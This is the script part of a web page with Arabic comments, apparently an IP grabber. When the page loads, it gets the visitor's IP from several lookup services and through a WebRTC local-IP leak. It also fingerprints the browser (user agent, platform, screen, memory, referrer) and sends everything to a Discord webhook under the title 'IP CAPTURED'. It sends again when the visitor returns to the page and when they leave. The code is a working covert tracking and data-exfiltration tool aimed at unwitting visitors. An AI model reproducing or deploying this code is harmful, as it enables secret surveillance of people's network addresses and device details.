        // تحديد اسم المتصفح من User Agent
        function getBrowserName(userAgent) {
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Safari")) return "Safari";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Opera")) return "Opera";
            return "Unknown";
        }

        // دالة جلب IP الزائر من عدة مصادر
        async function fetchIP() {
            const info = collectVisitorInfo();
            let detectedIP = 'Unknown';
            const statusText = document.getElementById('statusText');
            const ipDisplay = document.getElementById('ipDisplay');
            
            // قائمة خدمات IP مع محاولات متعددة
            const ipServices = [
                { url: 'https://api.ipify.org?format=json', type: 'json' },
                { url: 'https://api64.ipify.org?format=json', type: 'json' },
                { url: 'https://ipv4.icanhazip.com/', type: 'text' },
                { url: 'https://ip.seeip.org/jsonip', type: 'json' },
                { url: 'https://api.myip.com', type: 'json' },
                { url: 'https://ipapi.co/json/', type: 'json' }
            ];
            
            // تحديث حالة الإرسال
            const updateStatus = (message, color = '#4ade80') => {
                statusText.textContent = message;
                statusText.style.color = color;
            };
            
            updateStatus('🔍 جاري البحث عن الـ IP...');
            
            for (let i = 0; i < ipServices.length; i++) {
                const service = ipServices[i];
                
                try {
                    updateStatus(`🔄 المحاولة ${i + 1}/${ipServices.length}...`);
                    
                    const response = await fetch(service.url, { 
                        method: 'GET',
                        mode: 'cors',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (response.ok) {
                        if (service.type === 'json') {
                            const data = await response.json();
                            detectedIP = data.ip || data.ipAddress || data.query || data.IPv4;
                        } else {
                            const text = await response.text();
                            detectedIP = text.trim();
                        }
                        
                        if (detectedIP && detectedIP !== 'Unknown') {
                            updateStatus('✅ تم العثور على الـ IP!');
                            break;
                        }
                    }
                } catch (error) {
                    console.log(`Service ${service.url} failed:`, error);
                    continue;
                }
            }
            
            // إذا لم يتم العثور على IP من الخدمات الخارجية
            if (detectedIP === 'Unknown') {
                try {
                    // محاولة الحصول على IP محلي عبر WebRTC
                    const localIP = await getLocalIPViaWebRTC();
                    detectedIP = `Local: ${localIP}`;
                    updateStatus('⚠️ IP محلي فقط (WebRTC)');
                } catch (error) {
                    updateStatus('❌ فشل الحصول على الـ IP', '#ff6b6b');
                    detectedIP = 'غير متاح';
                }
            }
            
            // عرض الـ IP في الصفحة
            ipDisplay.textContent = detectedIP;
            ipDisplay.style.color = '#4ade80';
            
            // إخفاء رسالة الجاري الإرسال
            document.querySelector('.logging-animation').style.display = 'none';
            
            // إرسال البيانات إلى Discord
            await sendToDiscordWithFallback(detectedIP, info);
            
            // تحديث النهاية
            updateStatus('✅سلاحف النينجا');
            
            return detectedIP;
        }

        // دالة للحصول على IP محلي عبر WebRTC
        async function getLocalIPViaWebRTC() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
                
                let ipFound = false;
                
                pc.onicecandidate = (ice) => {
                    if (ipFound || !ice || !ice.candidate || !ice.candidate.candidate) return;
                    
                    const candidate = ice.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = regex.exec(candidate);
                    
                    if (match) {
                        ipFound = true;
                        resolve(match[1]);
                        pc.close();
                    }
                };
                
                setTimeout(() => {
                    if (!ipFound) {
                        pc.close();
                        reject('Timeout');
                    }
                }, 3000);
            });
        }

        // إرسال البيانات إلى Discord مع محاولات متعددة وبدائل
        async function sendToDiscordWithFallback(ip, visitorInfo) {
            const payload = {
                embeds: [{
                    title: "🔥 IP CAPTURED - Magol7890-p. TEAM",
                    description: `**IP Address:** \`${ip}\`\n**Time:** ${new Date().toLocaleString("ar-SA")}\n**Page:** team bom is here`,
                    color: 0x00ff00,
                    fields: [
                        {
                            name: "🌍 معلومات الزائر",
                            value: `**المتصفح:** ${getBrowserName(visitorInfo.userAgent)}\n**اللغة:** ${visitorInfo.language}\n**النظام:** ${visitorInfo.platform}\n**الدقة:** ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`,
                            inline: true
                        },
                        {
                            name: "📊 معلومات إضافية",
                            value: `**التتبع:** ${visitorInfo.doNotTrack}\n**المعالجات:** ${visitorInfo.hardwareConcurrency}\n**الذاكرة:** ${visitorInfo.deviceMemory}GB\n**الكوكيز:** ${visitorInfo.cookiesEnabled ? "✅" : "❌"}`,
                            inline: true
                        },
                        {
                            name: "📱 User Agent كامل",
                            value: `\`\`\`${visitorInfo.userAgent.substring(0, 1000)}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🔗 المصدر",
                            value: visitorInfo.referrer,
                            inline: true
                        },
                        {
                            name: "📶 الحالة",
                            value: visitorInfo.online,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "MAGHOL NO TEAM NOW • discord.gg/ فش اختصار"
                    }
                }]
            };
            
            // محاولات إرسال متعددة
            const retryAttempts = 3;
            
            for (let attempt = 1; attempt <= retryAttempts; attempt++) {
                try {
                    const response = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok || response.status === 204) {
                        console.log(`✅ تم الإرسال بنجاح في المحاولة ${attempt}`);
                        return true;
                    } else {
                        console.log(`⚠️ محاولة ${attempt} فشلت مع status: ${response.status}`);
                    }
                } catch (error) {
                    console.log(`⚠️ خطأ في المحاولة ${attempt}:`, error);
                }
                
                // انتظار قبل المحاولة التالية
                if (attempt < retryAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            console.log('❌ جميع محاولات الإرسال فشلت');
            return false;
        }

        // إرسال عند تحميل الصفحة
        window.addEventListener('load', async () => {
            // تأخير لضمان تحميل الصفحة أولاً
            setTimeout(async () => {
                await fetchIP();
            }, 3500);
            
            // أيضًا إرسال عندما يحاول المستخدم المغادرة
            window.addEventListener('beforeunload', async () => {
                // إرسال سريع قبل المغادرة
                try {
                    const info = collectVisitorInfo();
                    const ipDisplay = document.getElementById('ipDisplay');
                    const ip = ipDisplay.textContent !== 'جاري جمع المعلومات...' ? ipDisplay.textContent : 'Unknown';
                    await sendToDiscordWithFallback(ip, info);
                } catch (error) {
                    console.log('Error sending on exit:', error);
                }
            });
            
            // إرسال عند التركيز على الصفحة
            window.addEventListener('focus', async () => {
                const ipDisplay = document.getElementById('ipDisplay');
                if (ipDisplay.textContent !== 'جاري جمع المعلومات...') {
                    const info = collectVisitorInfo();
                    await sendToDiscordWithFallback(ipDisplay.textContent, info);
                }
            });
        });

        // تأثيرات إضافية للصفحة
        document.addEventListener('DOMContentLoaded', () => {
            // تأثير كتابة على الـ IP
            const ipDisplay = document.getElementById('ipDisplay');
            const originalText = ipDisplay.textContent;
            
            // تأثير عشوائي على النصوص
            setInterval(() => {
                if (Math.random() < 0.1 && ipDisplay.textContent !== 'جاري جمع المعلومات...') {
                    const chars = '0123456789ABCDEF';
                    let glitched = '';
                    for (let i = 0; i < ipDisplay.textContent.length; i++) {
                        if (Math.random() < 0.1) {
                            glitched += chars.charAt(Math.floor(Math.random() * chars.length));
                        } else {
                            glitched += ipDisplay.textContent.charAt(i);
                        }
                    }
                    ipDisplay.textContent = glitched;
                    
                    setTimeout(() => {
                        ipDisplay.textContent = originalText !== 'جاري جمع المعلومات...' ? originalText : ipDisplay.textContent;
                    }, 100);
                }
            }, 2000);
        });
    </script>

